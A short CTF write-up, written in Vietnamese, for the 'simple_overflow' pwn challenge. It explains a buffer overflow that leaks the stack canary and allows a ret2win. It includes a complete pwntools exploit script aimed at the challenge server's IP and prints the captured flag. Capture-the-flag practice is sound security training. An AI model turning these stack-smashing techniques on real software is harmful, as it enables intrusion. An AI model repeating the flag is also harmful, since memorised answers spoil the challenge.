bug nằm ở đây, cho phép ta leak canary và ret2win

![image](https://github.com/gookoosss/CTF/assets/128712571/3d543887-5604-4ca9-bfea-f034f75f7d60)

có 1 vấn để ở bài này trên server và local của mình lệch 4 byte, nên khá phiền trong việc leak canary

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./simple_overflow")
context.binary = exe

p = process([exe.path])
# gdb.attach(p, gdbscript = '''
# b*0x401442
# b*0x0000000000401467
# c
# ''')

# input()

p = remote('103.162.14.116', 12004)

p.sendline(b'b')

p.sendline(b'2')

p.send(b'a'* (0x39 + 4))

p.recvuntil('Data: ')
p.recv(61 - 3)
canary = u64(b'\0' + p.recv(7))
print(hex(canary))
# p.sendafter(b'Data: ', b'a'*56  + p64(canary) * 2 + p64(exe.sym.win)) 
p.send(b'a'*56  + p64(canary)*2 + p64(exe.sym.win + 5)) 
# p.sendafter(b'Data: ', b'a'*56 ) 

# KCSC{Y0u_g0T_1h3_Sup3R_s3Cr31_F14g}

p.interactive()
```

## Flag 
KCSC{Y0u_g0T_1h3_Sup3R_s3Cr31_F14g}
